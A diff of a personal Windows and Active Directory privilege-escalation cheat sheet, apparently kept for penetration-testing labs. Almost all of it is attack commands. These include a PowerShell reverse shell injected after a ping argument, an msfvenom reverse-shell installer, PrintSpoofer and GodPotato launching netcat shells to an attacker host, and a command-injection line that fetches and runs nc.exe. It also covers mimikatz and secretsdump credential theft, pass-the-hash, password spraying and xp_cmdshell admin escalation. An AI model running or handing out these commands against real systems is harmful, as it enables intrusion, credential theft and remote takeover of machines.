@@ -1,4 +1,5 @@
-f* Enumm Enumm Enumm!
+* Enumm Enumm Enumm!
+for privilege escalation
 
 $ ipcondig /all
 $ arp -a
@@ -12,10 +13,12 @@ $ echo %USERNAME%
 $ whoami /priv
 $ whoami /user
 $ whoami /groups
+$ net users
 $ net user <username> /domain
 $ net localgroup
 $ net localgroup administrators
 $ net accounts
+$ net group "Domain Admins" /domain
 $ wmic product get name
 $ Get-MpComputerStatus
 $ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
@@ -27,6 +30,7 @@ $ Get-ScheduledTask | select TaskName,State
 $ Set-ExecutionPolicy bypass -Scope process
 $ Get-ChildItem -Path C:\Users\ -Recurse -File | Select-String -Pattern 'ldapadmin'
 $ dir C:\ /s /b | findstr /i "confidential.txt"
+$ cd C:\windows.old\windows\system32
 
 * If you got the RDP session, Escalate privileges to SYSTEM create msfvenom
 $ msfvenom -p windows/x64/shell_reverse_tcp lhost=yourip lport=9443 -f msi -o aie.msi
@@ -55,9 +59,9 @@ $ wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | f
 $ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 
 * If you get ping command on webshell
-$ 127.0.0.1 && powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.147',8899);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-Try:
+$ 127.0.0.1 && powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<yourip>',<yourport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
+Try:
 * You have to got these!
 What is the active directory domain name?
 What is the hostname of the computer being taken over?
@@ -71,6 +75,7 @@ How many users are there in the domain and which user names have been hashed?
 > Checking SAM
 $ icacls c:\windows\system32\config\SAM
 $ impacket-secretdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-08-07 local
+$ secretdump.py LOCAL -system SYSTEM -sam SAM
 + CVE-2021-1675 PrintNightmare -> SeLoadDrivierPrivilege
 
 * Vulnerable Services
@@ -117,6 +122,8 @@ impacket smbserver
 * SeImpersonate and SeAssignPrimary Token
 $ printspoofer.exe -i -c cmd OR
 $ printspoofer.exe -i -c "C:\Temp\nc.exe -e cmd.exe IP port"
+$ ./GodPotato -cmd "C:\temp\nc.exe -t -e <IPkali> <port> C:\Windows\System32\cmd.exe"
+
 Connecting with MSSQLClient.py
 $ mssqlclient.py sqluser@ipadd -windows-auth
 SQL> enable_xp_cmdshell
@@ -132,6 +139,8 @@ $ mimikatz.exe
 > log
 > sekurlsa::minidump lsass.dmp
 > sekurlsa::logonpasswords
+* run hashcat to crack:
+$ hashcat -m 1000/0 hash rockyou.txt | https://hashes.com/en/tools/hash_identifier
 
 * SeTakeOwnershipPrivilege
 $ Import-Module .\Enable-Privilege.ps1
@@ -224,6 +233,7 @@ xfreerdp /u:uname /p:pass /cert:ignore /v:ip
 crackmapexec.py smb ip -u adnub -H hash
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
 crackmapexec smb <IP> -u users.txt -p passwords.txt
+$ netexec smb <IP> -u users.txt -p passwords.txt --continue-on-success | add --windows-auth OR --local-auth
 proxychains smbclient -U mdm.com/kocho --pw-nt-hash //iptarget2/Developer
 proxychains crackmapexec smb 'iptarget2' -u 'kocho' -H 'lmhash:ntlm' -d 'domain' --share
 evil-winrm -i <IP> -u <User> -H <NThash>
@@ -231,6 +241,27 @@ secretsdump.py <User>@<IP> -hashes <Hash>
 smbclient //<IP>/<Share> -U <User> --pw-nt-hash <Hash> -W <Domain>
 xfreerdp /v:yourip /u:moe /pth:ntlm hash
 psexec.py admin@ip -hashes hash
+
+* Reference for DirtyPipe privesc:
+https://github.com/n3rada/DirtyPipe
+* Reference for text4shell:
+https://github.com/kljunowsky/CVE-2022-42889-text4shell
+* Reference for JDWP:
+https://github.com/hugsy/jdwp-shellifier, check using busybox, trigerred also using nc in the machine
+* Reference for Freeswitch
+https://www.exploit-db.com/exploits/47799 | listen using powershell -e
+* Reference for VestaMail:
+https://github.com/CSpanias/vesta-rce-exploit?tab=readme-ov-file
+https://github.com/rekter0/exploits/blob/master/VestaCP/vestaEMAIL.py
+* Reference for tar wildcard:
+https://medium.com/%40althubianymalek/linux-privilege-escalation-using-tar-wildcards-a-step-by-step-guide-55771aae063f
+* Reference for Mobile Mouse:
+https://github.com/blue0x1/mobilemouse-exploit
+* GPOG Orchestrator:
+https://www.exploit-db.com/exploits/50558
+
+* Binary file:
+$ strings file.exe | grep password
 
 * Password Spraying :
 cme smb iptarget -u /path/to/users.txt -p password
@@ -265,7 +296,7 @@ $ winpeas.exe
 $ powerup
 $ cd C:\Users
 $ cd C:\windows.old\windows\system32 (find SAM and SYSTEM) if any
-$ responder en0tun
+$ sudo responder -I eth0
 $ rubeus.exe kerberoast /outfile:hashes.kerberoast
 $ rubeus.exe kerberoast /user:username /nowrap
 
@@ -283,21 +314,18 @@ EXEC xp_cmdshell 'whoami';
 * file transfer by smbserver:
 (on kali) impacket-smbserver share $(pwd) -smb2support
 				it means: the our smb share is \\kali-ip\share
-(on xp_cmdshell) EXEC xp_cmdshell 'copy \\10.10.14.5\share\PrintSpoofer.exe C:\Users\Public\ps.exe';
+(on xp_cmdshell) EXEC xp_cmdshell 'copy \\<IP>\share\PrintSpoofer.exe C:\Users\Public\ps.exe';
 
-* Tricky Transfer File to MS02, so we have to:
+* Tricky Transfer File to MS02, example:
 MS01: net share Myshare=C:\temp /GRANT:Everyone,FULL
 MS01: icacls "C:\temp\print.exe" /grant Everyone:R
 MS01: icacls "C:\temp\" /grant Everyone:RX
 
-MS02(MSSQL): EXEC xp_cmdshell 'net use Z: \\10.10.79.147\Myshare';
+MS02(MSSQL): EXEC xp_cmdshell 'net use Z: \\<ms02ip>\Myshare';
 MS02(MSSQL): EXEC xp_cmdshell 'copy Z:\print.exe C:\Users\Public\print.exe';
 
 MS02(MSSQL): EXEC xp_cmdshell 'C:\Users\Public\print.exe -c "net localgroup Administrators sql_svc /add"';
 MS02(MSSQL): EXEC xp_cmdshell 'net localgroup Administrators';
-
-* path traversal vuln:
-../../../../../../../../../............
 
 * command injection vuln:
 powershell -c iwr http://ipkali/nc.exe -OutFile \windows\temp\nc.exe;windows\temp\nc.exe -nv ipkali 443 -e cmd
